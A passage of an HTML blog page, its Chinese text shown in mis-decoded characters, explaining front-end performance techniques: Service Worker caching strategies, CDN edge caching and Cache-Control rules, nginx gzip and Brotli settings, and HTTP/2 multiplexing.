class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;install&#x27;</span>, <span class="hljs-function"><span class="hljs-params">event</span> =&gt;</span> &#123;<br>  event.<span class="hljs-title function_">waitUntil</span>(<br>    caches.<span class="hljs-title function_">open</span>(<span class="hljs-variable constant_">CACHE_NAME</span>)<br>      .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">cache</span> =&gt;</span> cache.<span class="hljs-title function_">addAll</span>(<span class="hljs-variable constant_">PRE_CACHE_URLS</span>))  <span class="hljs-comment">// é¢„ç¼“å­˜æ ¸å¿ƒèµ„æº</span><br>      .<span class="hljs-title function_">then</span>(<span class="hljs-function">() =&gt;</span> self.<span class="hljs-title function_">skipWaiting</span>())  <span class="hljs-comment">// å¼ºåˆ¶æ¿€æ´»æ–°SW</span><br>  );<br>&#125;);<br></code></pre></td></tr></table></figure><p>(2) ç¼“å­˜ç­–ç•¥å®æ–½ - æ‹¦æˆªè¯·æ±‚å¹¶å“åº”ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript">self.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;fetch&#x27;</span>, <span class="hljs-function"><span class="hljs-params">event</span> =&gt;</span> &#123;<br>  event.<span class="hljs-title function_">respondWith</span>(<br>    <span class="hljs-comment">// ç­–ç•¥1ï¼šç¼“å­˜ä¼˜å…ˆï¼ˆç¦»çº¿ä¼˜å…ˆï¼‰</span><br>    caches.<span class="hljs-title function_">match</span>(event.<span class="hljs-property">request</span>)<br>      .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">cached</span> =&gt;</span> cached || <span class="hljs-title function_">fetchAndCache</span>(event.<span class="hljs-property">request</span>))<br>    <br>    <span class="hljs-comment">// ç­–ç•¥2ï¼šç½‘ç»œä¼˜å…ˆï¼ˆå®æ—¶æ•°æ®ï¼‰</span><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">    fetch(event.request)</span><br><span class="hljs-comment">      .catch(() =&gt; caches.match(event.request))</span><br><span class="hljs-comment">    */</span><br>  );<br>&#125;);<br><br><span class="hljs-comment">// ç½‘ç»œè¯·æ±‚å¹¶ç¼“å­˜</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">fetchAndCache</span>(<span class="hljs-params">request</span>) &#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-title function_">fetch</span>(request).<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">networkRes</span> =&gt;</span> &#123;<br>    <span class="hljs-comment">// å…‹éš†å“åº”ï¼ˆæµåªèƒ½è¯»å–ä¸€æ¬¡ï¼‰</span><br>    <span class="hljs-keyword">const</span> resClone = networkRes.<span class="hljs-title function_">clone</span>();<br>    caches.<span class="hljs-title function_">open</span>(<span class="hljs-variable constant_">CACHE_NAME</span>).<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">cache</span> =&gt;</span> cache.<span class="hljs-title function_">put</span>(request, resClone));<br>    <span class="hljs-keyword">return</span> networkRes;<br>  &#125;);<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>ç¼“å­˜æ›´æ–°æœºåˆ¶</strong></p><p>(1) ç‰ˆæœ¬åŒ–ç¼“å­˜å‘½å</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// æ›´æ–°SWæ—¶ä¿®æ”¹ç‰ˆæœ¬å·</span><br><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">CACHE_NAME</span> = <span class="hljs-string">&#x27;v2-static&#x27;</span>;  <span class="hljs-comment">// æ–°ç‰ˆæœ¬</span><br></code></pre></td></tr></table></figure><p>(2) æ¿€æ´»é˜¶æ®µæ¸…ç†æ—§ç¼“å­˜</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript">self.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;activate&#x27;</span>, <span class="hljs-function"><span class="hljs-params">event</span> =&gt;</span> &#123;<br>  event.<span class="hljs-title function_">waitUntil</span>(<br>    caches.<span class="hljs-title function_">keys</span>().<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">cacheNames</span> =&gt;</span> <br>      <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">all</span>(<br>        cacheNames.<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">name</span> =&gt;</span> &#123;<br>          <span class="hljs-keyword">if</span> (name !== <span class="hljs-variable constant_">CACHE_NAME</span>) <span class="hljs-keyword">return</span> caches.<span class="hljs-title function_">delete</span>(name); <span class="hljs-comment">// åˆ é™¤æ—§ç¼“å­˜</span><br>        &#125;)<br>      ).<span class="hljs-title function_">then</span>(<span class="hljs-function">() =&gt;</span> self.<span class="hljs-property">clients</span>.<span class="hljs-title function_">claim</span>())  <span class="hljs-comment">// ç«‹å³æ§åˆ¶æ‰€æœ‰é¡µé¢</span><br>  );<br>&#125;);<br></code></pre></td></tr></table></figure><p><strong>æ€§èƒ½ä¼˜åŒ–æŠ€å·§</strong></p><p>(1) ç¼“å­˜åˆ†æ®µç­–ç•¥</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">CORE_CACHE</span> = <span class="hljs-string">&#x27;core-v1&#x27;</span>;   <span class="hljs-comment">// æ ¸å¿ƒé¡µé¢</span><br><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">IMG_CACHE</span> = <span class="hljs-string">&#x27;images-v1&#x27;</span>;  <span class="hljs-comment">// å›¾ç‰‡èµ„æº</span><br><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">API_CACHE</span> = <span class="hljs-string">&#x27;api-v1&#x27;</span>;     <span class="hljs-comment">// APIæ•°æ®</span><br></code></pre></td></tr></table></figure><p>(2) åŠ¨æ€ç¼“å­˜é™åˆ¶</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// ç¼“å­˜æœ€å¤š50ä¸ªAPIå“åº”</span><br>caches.<span class="hljs-title function_">open</span>(<span class="hljs-variable constant_">API_CACHE</span>).<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">cache</span> =&gt;</span> &#123;<br>  cache.<span class="hljs-title function_">keys</span>().<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">keys</span> =&gt;</span> &#123;<br>    <span class="hljs-keyword">if</span> (keys.<span class="hljs-property">length</span> &gt; <span class="hljs-number">50</span>) cache.<span class="hljs-title function_">delete</span>(keys[<span class="hljs-number">0</span>]);<br>  &#125;);<br>&#125;);<br></code></pre></td></tr></table></figure><p>(3) Stale-While-Revalidate</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript">event.<span class="hljs-title function_">respondWith</span>(<br>  caches.<span class="hljs-title function_">match</span>(request).<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">cached</span> =&gt;</span> &#123;<br>    <span class="hljs-keyword">const</span> fetchPromise = <span class="hljs-title function_">fetchAndCache</span>(request);<br>    <span class="hljs-keyword">return</span> cached || fetchPromise;  <span class="hljs-comment">// ä¼˜å…ˆè¿”å›ç¼“å­˜ï¼Œåå°æ›´æ–°</span><br>  &#125;)<br>);<br></code></pre></td></tr></table></figure><p><strong>å®Œæ•´ç¤ºä¾‹æ¶æ„</strong></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs Text">/public<br>  â”œâ”€â”€ index.html<br>  â”œâ”€â”€ styles.css<br>  â”œâ”€â”€ app.js<br>  â””â”€â”€ sw.js   # Service Workerä¸»æ–‡ä»¶<br></code></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// sw.js</span><br><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">CORE_CACHE</span> = <span class="hljs-string">&#x27;core-v1&#x27;</span>;<br><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">CORE_URLS</span> = [ <span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-string">&#x27;/offline.html&#x27;</span> ];<br><br><span class="hljs-comment">// å®‰è£…é˜¶æ®µ</span><br>self.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;install&#x27;</span>, <span class="hljs-function"><span class="hljs-params">event</span> =&gt;</span> &#123;<br>  event.<span class="hljs-title function_">waitUntil</span>(<br>    caches.<span class="hljs-title function_">open</span>(<span class="hljs-variable constant_">CORE_CACHE</span>)<br>      .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">cache</span> =&gt;</span> cache.<span class="hljs-title function_">addAll</span>(<span class="hljs-variable constant_">CORE_URLS</span>))<br>      .<span class="hljs-title function_">then</span>(<span class="hljs-function">() =&gt;</span> self.<span class="hljs-title function_">skipWaiting</span>())<br>  );<br>&#125;);<br><br><span class="hljs-comment">// æ¿€æ´»æ¸…ç†</span><br>self.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;activate&#x27;</span>, <span class="hljs-function"><span class="hljs-params">event</span> =&gt;</span> &#123;<br>  event.<span class="hljs-title function_">waitUntil</span>(<br>    caches.<span class="hljs-title function_">keys</span>().<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">keys</span> =&gt;</span> <br>      <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">all</span>(keys.<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">key</span> =&gt;</span> <br>        key !== <span class="hljs-variable constant_">CORE_CACHE</span> ? caches.<span class="hljs-title function_">delete</span>(key) : <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">resolve</span>()<br>      ))<br>    ).<span class="hljs-title function_">then</span>(<span class="hljs-function">() =&gt;</span> self.<span class="hljs-property">clients</span>.<span class="hljs-title function_">claim</span>())<br>  );<br>&#125;);<br><br><span class="hljs-comment">// æ‹¦æˆªè¯·æ±‚</span><br>self.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;fetch&#x27;</span>, <span class="hljs-function"><span class="hljs-params">event</span> =&gt;</span> &#123;<br>  <span class="hljs-keyword">const</span> &#123; request &#125; = event;<br>  <br>  <span class="hljs-comment">// å¯¼èˆªè¯·æ±‚å›é€€åˆ°ç¦»çº¿é¡µé¢</span><br>  <span class="hljs-keyword">if</span> (request.<span class="hljs-property">mode</span> === <span class="hljs-string">&#x27;navigate&#x27;</span>) &#123;<br>    event.<span class="hljs-title function_">respondWith</span>(<br>      <span class="hljs-title function_">fetch</span>(request).<span class="hljs-title function_">catch</span>(<span class="hljs-function">() =&gt;</span> caches.<span class="hljs-title function_">match</span>(<span class="hljs-string">&#x27;/offline.html&#x27;</span>))<br>    );<br>    <span class="hljs-keyword">return</span>;<br>  &#125;<br><br>  <span class="hljs-comment">// é™æ€èµ„æºç¼“å­˜ä¼˜å…ˆ</span><br>  event.<span class="hljs-title function_">respondWith</span>(<br>    caches.<span class="hljs-title function_">match</span>(request).<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">cached</span> =&gt;</span> <br>      cached || <span class="hljs-title function_">fetch</span>(request).<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">res</span> =&gt;</span> &#123;<br>        <span class="hljs-comment">// ä»…ç¼“å­˜å®‰å…¨èµ„æº</span><br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_">isCacheable</span>(request, res)) &#123;<br>          <span class="hljs-keyword">const</span> clone = res.<span class="hljs-title function_">clone</span>();<br>          caches.<span class="hljs-title function_">open</span>(<span class="hljs-title function_">dynamicCacheName</span>(request)).<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">cache</span> =&gt;</span> <br>            cache.<span class="hljs-title function_">put</span>(request, clone)<br>          );<br>        &#125;<br>        <span class="hljs-keyword">return</span> res;<br>      &#125;)<br>    )<br>  );<br>&#125;);<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">isCacheable</span>(<span class="hljs-params">req, res</span>) &#123;<br>  <span class="hljs-keyword">return</span> req.<span class="hljs-property">method</span> === <span class="hljs-string">&#x27;GET&#x27;</span> &amp;&amp; <br>         res.<span class="hljs-property">status</span> === <span class="hljs-number">200</span> &amp;&amp; <br>         !req.<span class="hljs-property">url</span>.<span class="hljs-title function_">includes</span>(<span class="hljs-string">&#x27;/api/private&#x27;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="4-2-èµ„æºåŠ è½½ä¼˜åŒ–"><a href="#4-2-èµ„æºåŠ è½½ä¼˜åŒ–" class="headerlink" title="4.2 èµ„æºåŠ è½½ä¼˜åŒ–"></a>4.2 èµ„æºåŠ è½½ä¼˜åŒ–</h2><h3 id="CDNåŸç†ä¸ç¼“å­˜é…ç½®ï¼ˆè¾¹ç¼˜èŠ‚ç‚¹-å›æºç­–ç•¥ï¼‰"><a href="#CDNåŸç†ä¸ç¼“å­˜é…ç½®ï¼ˆè¾¹ç¼˜èŠ‚ç‚¹-å›æºç­–ç•¥ï¼‰" class="headerlink" title="CDNåŸç†ä¸ç¼“å­˜é…ç½®ï¼ˆè¾¹ç¼˜èŠ‚ç‚¹&#x2F;å›æºç­–ç•¥ï¼‰"></a>CDNåŸç†ä¸ç¼“å­˜é…ç½®ï¼ˆè¾¹ç¼˜èŠ‚ç‚¹&#x2F;å›æºç­–ç•¥ï¼‰</h3><p><strong>CDN æ ¸å¿ƒåŸç†</strong></p><p>å®šä¹‰ï¼šå†…å®¹åˆ†å‘ç½‘ç»œï¼ˆContent Delivery Networkï¼‰ï¼Œé€šè¿‡å…¨çƒåˆ†å¸ƒçš„è¾¹ç¼˜èŠ‚ç‚¹ç¼“å­˜é™æ€èµ„æºï¼Œä½¿ç”¨æˆ·å°±è¿‘è®¿é—®ï¼Œé™ä½å»¶è¿Ÿä¸æºç«™å‹åŠ›ã€‚</p><pre class="mermaid">graph LR  A[ç”¨æˆ·] --> B{å°±è¿‘è¾¹ç¼˜èŠ‚ç‚¹}  B -->|èµ„æºå‘½ä¸­| C[å¿«é€Ÿè¿”å›ç¼“å­˜]  B -->|èµ„æºæœªå‘½ä¸­| D[å›æºç«™æ‹‰å–èµ„æº]  D --> E[ç¼“å­˜è‡³è¾¹ç¼˜èŠ‚ç‚¹]  E --> A</pre><p>ä¸‰å¤§æ ¸å¿ƒç»„ä»¶ï¼š</p><ul><li>è¾¹ç¼˜èŠ‚ç‚¹ï¼ˆEdge Nodeï¼‰</li><li>å›æºç­–ç•¥ï¼ˆOrigin Fetchï¼‰</li><li>è°ƒåº¦ç³»ç»Ÿï¼ˆDNSè´Ÿè½½å‡è¡¡ï¼‰</li></ul><p><strong>è¾¹ç¼˜èŠ‚ç‚¹ï¼ˆEdge Nodeï¼‰</strong></p><ul><li>ä½ç½®ï¼šå…¨çƒæ•°ç™¾ä¸ªPOPç‚¹ï¼ˆPoint of Presenceï¼‰</li><li>åŠŸèƒ½ï¼š<ul><li>ç›´æ¥å“åº”ç»ˆç«¯ç”¨æˆ·è¯·æ±‚</li><li>ç¼“å­˜é™æ€èµ„æºï¼ˆHTML&#x2F;CSS&#x2F;JS&#x2F;å›¾ç‰‡&#x2F;è§†é¢‘ï¼‰</li><li>æ‰§è¡Œå®‰å…¨é˜²æŠ¤ï¼ˆDDoSç¼“è§£&#x2F;WAFï¼‰</li></ul></li></ul><p><strong>å›æºç­–ç•¥ï¼ˆOrigin Fetchï¼‰</strong></p><ul><li>è§¦å‘æ¡ä»¶ï¼šè¾¹ç¼˜èŠ‚ç‚¹æ— ç¼“å­˜æˆ–ç¼“å­˜è¿‡æœŸ</li><li>å›æºæµç¨‹ï¼š</li></ul><pre class="mermaid">sequenceDiagram    participant User as ç”¨æˆ·    participant EdgeNode as CDNè¾¹ç¼˜èŠ‚ç‚¹    participant Origin as æºç«™æœåŠ¡å™¨    User->>EdgeNode: 1. è¯·æ±‚èµ„æº /image.jpg    Note right of EdgeNode: æ£€æŸ¥æœ¬åœ°ç¼“å­˜    alt ç¼“å­˜å‘½ä¸­ä¸”æœ‰æ•ˆ        EdgeNode-->>User: 2. ç›´æ¥è¿”å›ç¼“å­˜èµ„æº    else ç¼“å­˜æœªå‘½ä¸­æˆ–è¿‡æœŸ        EdgeNode->>Origin: 3. å›æºè¯·æ±‚ (æºå¸¦ç¼“å­˜éªŒè¯å¤´)        Origin-->>EdgeNode: 4. è¿”å›èµ„æº + ç¼“å­˜å¤´        EdgeNode->>EdgeNode: 5. ç¼“å­˜èµ„æº (æŒ‰ç­–ç•¥)        EdgeNode-->>User: 6. è¿”å›èµ„æº    end</pre><p><strong>è°ƒåº¦ç³»ç»Ÿï¼ˆDNSè´Ÿè½½å‡è¡¡ï¼‰</strong></p><ul><li>GSLBï¼ˆå…¨å±€è´Ÿè½½å‡è¡¡ï¼‰ï¼šæ ¹æ®ç”¨æˆ·IPåˆ†é…æœ€è¿‘èŠ‚ç‚¹</li><li>è°ƒåº¦ç®—æ³•ï¼š<ul><li>åœ°ç†ä½ç½®ä¼˜å…ˆ</li><li>èŠ‚ç‚¹å¥åº·æ£€æŸ¥</li><li>å®æ—¶æµé‡åˆ†æ</li></ul></li></ul><p><strong>ç¼“å­˜é…ç½®ç­–ç•¥</strong></p><p>(1) è§„åˆ™è®¾ç½®</p><table><thead><tr><th align="left">é…ç½®æ–¹å¼</th><th align="left">æŒ‡ä»¤ç¤ºä¾‹</th><th align="left">ä½œç”¨</th></tr></thead><tbody><tr><td align="left">å¼ºåˆ¶ç¼“å­˜</td><td align="left">Cache-Control: public, max-age&#x3D;86400</td><td align="left">èµ„æºåœ¨CDNç¼“å­˜1å¤©</td></tr><tr><td align="left">å¿½ç•¥ç¼“å­˜</td><td align="left">Cache-Control: no-store</td><td align="left">CDNä¸ç¼“å­˜ï¼ˆæ¯æ¬¡å›æºï¼‰</td></tr><tr><td align="left">æ¡ä»¶ç¼“å­˜</td><td align="left">Cache-Control: no-cache</td><td align="left">CDNæ¯æ¬¡å›æºéªŒè¯ï¼ˆç±»ä¼¼åå•†ç¼“å­˜ï¼‰</td></tr></tbody></table><p>(2) å…¸å‹èµ„æºé…ç½®</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-comment"># Nginxé…ç½®ç¤ºä¾‹ï¼ˆæºç«™ï¼‰</span><br><span class="hljs-section">location</span> <span class="hljs-regexp">~* \.(js|css|png)$</span> &#123;<br>  <span class="hljs-attribute">add_header</span> Cache-Control <span class="hljs-string">&quot;public, max-age=31536000, immutable&quot;</span>;  <span class="hljs-comment"># é™æ€èµ„æºé•¿ç¼“å­˜</span><br>&#125;<br><br><span class="hljs-section">location</span> /api/ &#123;<br>  <span class="hljs-attribute">add_header</span> Cache-Control <span class="hljs-string">&quot;no-cache&quot;</span>;  <span class="hljs-comment"># APIä¸ç¼“å­˜</span><br>&#125;<br></code></pre></td></tr></table></figure><p><strong>è¾¹ç¼˜èŠ‚ç‚¹ç¼“å­˜è¡Œä¸º</strong></p><table><thead><tr><th align="left">è¯·æ±‚çŠ¶æ€</th><th align="left">å¤„ç†æ–¹å¼</th><th align="left">å“åº”æ—¶é—´å¯¹æ¯”æºç«™</th></tr></thead><tbody><tr><td align="left">ç¼“å­˜å‘½ä¸­</td><td align="left">ç›´æ¥è¿”å›èµ„æº</td><td align="left">å¿« 5-10å€ï¼ˆ&lt;50msï¼‰</td></tr><tr><td align="left">ç¼“å­˜æœªå‘½ä¸­</td><td align="left">å›æºæ‹‰å– â†’ ç¼“å­˜ â†’ è¿”å›</td><td align="left">ä¸æºç«™ç›¸åŒ</td></tr><tr><td align="left">ç¼“å­˜è¿‡æœŸ</td><td align="left">å›æºéªŒè¯ï¼ˆIf-Modified-Sinceï¼‰</td><td align="left">èŠ‚çœå¸¦å®½ï¼ˆ304å“åº”ï¼‰</td></tr></tbody></table><h3 id="èµ„æºå‹ç¼©ï¼ˆGzip-Brotliï¼‰ä¸HTTP-2å¤šè·¯å¤ç”¨"><a href="#èµ„æºå‹ç¼©ï¼ˆGzip-Brotliï¼‰ä¸HTTP-2å¤šè·¯å¤ç”¨" class="headerlink" title="èµ„æºå‹ç¼©ï¼ˆGzip&#x2F;Brotliï¼‰ä¸HTTP&#x2F;2å¤šè·¯å¤ç”¨"></a>èµ„æºå‹ç¼©ï¼ˆGzip&#x2F;Brotliï¼‰ä¸HTTP&#x2F;2å¤šè·¯å¤ç”¨</h3><p><strong>èµ„æºå‹ç¼©ï¼ˆGzip vs Brotliï¼‰</strong></p><p>æ ¸å¿ƒç›®æ ‡ï¼šå‡å°èµ„æºä½“ç§¯ â†’ é™ä½ä¼ è¾“æ—¶é—´</p><table><thead><tr><th align="left">ç‰¹æ€§</th><th align="left">Gzip</th><th align="left">Brotli</th><th align="left">ä¼˜åŠ¿å¯¹æ¯”</th></tr></thead><tbody><tr><td align="left">å‹ç¼©ç‡</td><td align="left">å‡å°‘70%å¤§å°</td><td align="left">å‡å°‘85%å¤§å°</td><td align="left">Brotlié«˜20%+</td></tr><tr><td align="left">ç®—æ³•åŸç†</td><td align="left">DEFLATEç®—æ³•ï¼ˆLZ77+å“ˆå¤«æ›¼ï¼‰</td><td align="left">LZ77æ”¹è¿›+ä¸Šä¸‹æ–‡å»ºæ¨¡</td><td align="left">æ›´é«˜æ•ˆå­—å…¸å‹ç¼©</td></tr><tr><td align="left">å‹ç¼©é€Ÿåº¦</td><td align="left">å¿«ï¼ˆä½CPUæ¶ˆè€—ï¼‰</td><td align="left">æ…¢ï¼ˆå‹ç¼©æ—¶CPUé«˜3å€ï¼‰</td><td align="left">Gzipæ›´é€‚åˆåŠ¨æ€å‹ç¼©</td></tr><tr><td align="left">è§£å‹é€Ÿåº¦</td><td align="left">æå¿«</td><td align="left">æå¿«</td><td align="left">æŒå¹³</td></tr><tr><td align="left">æµè§ˆå™¨æ”¯æŒ</td><td align="left">å…¨å¹³å°ï¼ˆIE6+ï¼‰</td><td align="left">Chrome&gt;50, Firefox&gt;44, Safari&gt;15</td><td align="left">Gzipå…¼å®¹æ€§æ›´å¹¿</td></tr><tr><td align="left">æœ€ä½³é€‚ç”¨</td><td align="left">åŠ¨æ€å†…å®¹ï¼ˆAPIå“åº”ï¼‰</td><td align="left">é™æ€èµ„æºï¼ˆJS&#x2F;CSS&#x2F;å­—ä½“ï¼‰</td><td align="left"></td></tr></tbody></table><p>é…ç½®ç¤ºä¾‹ï¼š</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-comment"># å¯ç”¨åŒå‹ç¼©ç­–ç•¥</span><br><span class="hljs-attribute">gzip</span> <span class="hljs-literal">on</span>;<br><span class="hljs-attribute">gzip_types</span> text/plain text/css application/json application/javascript;<br><span class="hljs-attribute">gzip_min_length</span> <span class="hljs-number">1024</span>;  <span class="hljs-comment"># å¤§äº1KBæ‰å‹ç¼©</span><br><br><span class="hljs-attribute">brotli</span> <span class="hljs-literal">on</span>;<br><span class="hljs-attribute">brotli_types</span> application/xml image/svg+xml;<br><span class="hljs-attribute">brotli_static</span> <span class="hljs-literal">on</span>;      <span class="hljs-comment"># ä¼˜å…ˆä½¿ç”¨é¢„å‹ç¼©æ–‡ä»¶</span><br></code></pre></td></tr></table></figure><p>å‰ç«¯æ”¶ç›Šï¼š</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs Text">åŸå§‹æ–‡ä»¶ï¼š 200KB<br>Gzipåï¼š  60KBï¼ˆèŠ‚çœ140KBï¼‰<br>Brotliåï¼š30KBï¼ˆèŠ‚çœ170KBï¼‰ â†’ 3Gç½‘ç»œä¸‹åŠ è½½æ—¶é—´å‡å°‘40%<br></code></pre></td></tr></table></figure><p><strong>HTTP&#x2F;2å¤šè·¯å¤ç”¨ï¼ˆMultiplexingï¼‰</strong></p><p>æ ¸å¿ƒé—®é¢˜ï¼šHTTP&#x2F;1.1çš„é˜Ÿå¤´é˜»å¡ï¼ˆ6ä¸ªTCPè¿æ¥é™åˆ¶ï¼‰</p><pre class="mermaid">graph LR  A[HTTP/1.1] --> B[è¯·æ±‚1] --> C[å“åº”1] --> D[è¯·æ±‚2] --> E[å“åº”2]  F[HTTP/2] --> G[è¯·æ±‚1/2/3] --> H[å“åº”1/2/3 å¹¶è¡Œ]</pre><p>å®ç°åŸç†ï¼š</p><ul><li>äºŒè¿›åˆ¶åˆ†å¸§å±‚ï¼š<ul><li>å°†è¯·æ±‚&#x2F;å“åº”åˆ†è§£ä¸ºäºŒè¿›åˆ¶å¸§ï¼ˆHEADERS&#x2F;DATAï¼‰</li><li>æ¯ä¸ªå¸§æºå¸¦æµIDï¼ˆStream Identifierï¼‰</li></ul></li><li>æµä¼˜å…ˆçº§ï¼š</li></ul><pre class="mermaid">graph TB  S1[æµID11 CSS] -->|ä¼˜å…ˆçº§é«˜| æµè§ˆå™¨  S2[æµID13 JS] -->|ä¼˜å…ˆçº§ä¸­| æµè§ˆå™¨  S3[æµID15 å›¾ç‰‡] -->|ä¼˜å…ˆçº§ä½| æµè§ˆå™¨</pre><p>æ€§èƒ½å¯¹æ¯”ï¼š</p><table><thead><tr><th align="left">åœºæ™¯</th><th align="left">HTTP&#x2F;1.1</th><th align="left">HTTP&#x2F;2</th><th align="left">æå‡</th></tr></thead><tbody><tr><td align="left">100ä¸ªå°æ–‡ä»¶ï¼ˆ1KBï¼‰</td><td align="left">1.5sï¼ˆ6è¿æ¥æ’é˜Ÿï¼‰</td><td align="left">0.3sï¼ˆå•è¿æ¥å¹¶è¡Œï¼‰</td><td align="left">80%</td></tr><tr><td align="left">é¦–å±æ¸²æŸ“æ—¶é—´</td><td align="left">2.8s</td><td align="left">1.5s</td><td align="left">46%</td></tr><tr><td align="left">TCPè¿æ¥æ•°</td><td align="left">6-8ä¸ª</td><td align="left">1ä¸ª</td><td align="left">èµ„æºèŠ‚çœ</td></tr></tbody></table><p><strong>HTTP&#x2F;2æ ¸å¿ƒç‰¹æ€§ååŒä¼˜åŒ–</strong></p><table><thead><tr><th align="left">ç‰¹æ€§</th><th align="left">é…åˆå‹ç¼©ä¸å¤šè·¯å¤ç”¨çš„ä½œç”¨</th></tr></thead><tbody><tr><td align="left">å¤´éƒ¨å‹ç¼©ï¼ˆHPACKï¼‰</td><td 